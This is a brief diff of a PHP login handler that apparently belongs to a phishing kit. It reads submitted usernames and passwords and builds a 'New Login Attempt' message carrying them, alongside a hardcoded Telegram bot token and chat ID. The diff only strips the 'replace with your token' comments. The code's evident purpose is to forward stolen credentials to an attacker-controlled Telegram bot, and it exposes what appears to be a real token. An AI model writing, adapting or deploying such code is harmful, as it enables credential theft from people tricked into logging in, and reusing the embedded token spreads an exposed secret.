@@ -3,8 +3,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = htmlspecialchars($_POST["username"]);
     $password = htmlspecialchars($_POST["password"]);
 
-    $botToken = "7376924106:AAFTGm6XCAbnzc-M5VeIRqMm-9I9859oxpQ";  // Replace with your Telegram bot token
-    $chatId = "6199929198";      // Replace with your chat ID
+    $botToken = "7376924106:AAFTGm6XCAbnzc-M5VeIRqMm-9I9859oxpQ";
+    $chatId = "6199929198";
 
     $message = "🚀 New Login Attempt\nUsername: $username\nPassword: $password";
 
